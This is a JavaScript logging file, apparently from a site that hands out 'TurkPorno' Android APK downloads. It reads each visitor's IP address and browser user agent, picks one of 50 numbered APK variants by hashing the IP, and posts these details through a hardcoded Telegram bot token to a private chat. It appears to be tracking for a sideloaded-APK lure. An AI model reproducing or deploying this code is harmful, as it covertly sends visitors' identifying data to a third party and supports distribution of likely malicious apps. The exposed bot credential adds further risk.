// log.js
async function sendLog(apkUrl) {
    const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
    const chatId = '-1002478190818';
    const userAgent = navigator.userAgent;
    
    try {
        // IP'yi al
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;
        
        // APK index'ini hesapla (1-50 arası)
        let hash = 0;
        for (let i = 0; i < ip.length; i++) {
            hash = ((hash << 5) - hash) + ip.charCodeAt(i);
            hash = hash & hash;
        }
        const apkIndex = Math.abs(hash) % 50 + 1;
        
        // Zaman
        const now = new Date();
        const timeStr = now.toLocaleString('tr-TR');
        
        // Mesaj
        const message = `[TurkPorno] Yeni İndirme\n━━━━━━━━━━━━━━━━━━━━━\n📱 IP: ${ip}\n📦 APK: TurkPornoV1.1.${apkIndex}.apk\n🔗 Link: ${apkUrl}\n📱 Cihaz: ${userAgent}\n⏰ Zaman: ${timeStr}\n━━━━━━━━━━━━━━━━━━━━━`;
        
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        
        if (response.ok) {
            console.log('✅ Telegram log gönderildi:', ip);
        } else {
            console.error('❌ Telegram hatası:', await response.text());
        }
        
    } catch (err) {
        console.error('❌ Log gönderme hatası:', err);
    }
}

window.sendLog = sendLog;
